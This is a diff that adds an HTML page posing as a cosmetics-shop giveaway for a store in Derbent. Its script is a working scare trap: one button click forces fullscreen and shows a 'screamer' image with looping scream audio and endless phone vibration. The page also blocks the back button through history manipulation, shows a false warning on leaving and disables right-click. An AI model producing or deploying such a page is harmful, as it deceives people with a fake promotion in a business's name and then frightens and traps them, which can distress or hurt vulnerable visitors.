@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Skin Level | GIVEAWAY 🛍️</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;600&family=Playfair+Display:ital,wght@0,700;1,700&display=swap" rel="stylesheet">
+    <style>
+        :root { --gold: #d4a58e; --dark: #121212; --glass: rgba(255, 255, 255, 0.95); }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-font-smoothing: antialiased; }
+        body { background: linear-gradient(135deg, #fdfcfb 0%, #e2d1c3 100%); font-family: 'Montserrat', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        
+        .app-card { width: 92%; max-width: 380px; background: var(--glass); border-radius: 30px; padding: 40px 25px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); border: 1px solid rgba(255,255,255,0.3); text-align: center; position: relative; }
+        
+        .badge { display: inline-block; padding: 6px 12px; background: #e8f5e9; color: #2e7d32; border-radius: 50px; font-size: 10px; font-weight: 600; margin-bottom: 20px; letter-spacing: 1px; }
+        
+        .brand { font-family: 'Playfair Display', serif; font-size: 38px; color: var(--dark); font-style: italic; margin-bottom: 5px; }
+        .sub-brand { font-size: 10px; letter-spacing: 4px; color: var(--gold); text-transform: uppercase; margin-bottom: 30px; }
+        
+        .promo-box { background: #fff; border: 1px dashed var(--gold); border-radius: 20px; padding: 20px; margin-bottom: 25px; }
+        .promo-box h2 { font-size: 16px; color: #333; margin-bottom: 8px; }
+        .promo-box p { font-size: 12px; color: #777; line-height: 1.5; }
+        
+        .main-btn { background: var(--dark); color: white; border: none; padding: 20px; width: 100%; border-radius: 15px; font-weight: 600; font-size: 14px; letter-spacing: 1px; text-transform: uppercase; cursor: pointer; box-shadow: 0 10px 20px rgba(0,0,0,0.15); transition: 0.3s; }
+        .main-btn:active { transform: scale(0.95); }
+
+        .location-info { margin-top: 25px; font-size: 11px; color: #999; }
+        .dog-icon { font-size: 14px; margin-top: 10px; display: block; }
+
+        /* SCREAMER CORE */
+        #trap { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; }
+        #trap img { width: 100%; height: 100%; object-fit: cover; }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+    <div class="app-card">
+        <span class="badge">LIVE: ДЕРБЕНТ</span>
+        <h1 class="brand">Skin Level</h1>
+        <p class="sub-brand">Premium Cosmetics</p>
+        
+        <div class="promo-box">
+            <h2>GIVEAWAY: KOREAN BOX 🎁</h2>
+            <p>Вы находитесь в зоне охвата магазина на <b>Гейдара Алиева</b>. Участвуйте в розыгрыше бокса (The Ordinary, Kombucha)!</p>
+        </div>
+
+        <button class="main-btn" id="go">Проверить местоположение</button>
+
+        <div class="location-info">
+            <p>📍 ул. Гейдара Алиева, 11в/1</p>
+            <p>🕘 10:00 — 20:00</p>
+            <span class="dog-icon">🐕 Можно с собакой</span>
+        </div>
+    </div>
+
+    <div id="trap"><img src="screamer.jpg"></div>
+
+    <script>
+        const btn = document.getElementById('go');
+        const trap = document.getElementById('trap');
+        const audio = new Audio('kriki-skrimery.mp3');
+
+        // Блокировка выхода
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => history.pushState(null, null, location.href);
+        window.onbeforeunload = () => "Участие в розыгрыше будет аннулировано!";
+
+        btn.addEventListener('click', () => {
+            // Запуск полноэкранного режима
+            let doc = document.documentElement;
+            if(doc.requestFullscreen) doc.requestFullscreen();
+            
+            btn.innerText = "ОПРЕДЕЛЕНИЕ...";
+            
+            setTimeout(() => {
+                trap.style.display = 'block';
+                audio.loop = true;
+                audio.play();
+
+                if (navigator.vibrate) {
+                    setInterval(() => navigator.vibrate([400, 100, 400]), 500);
+                }
+            }, 1200);
+        });
+    </script>
+</body>
+</html>
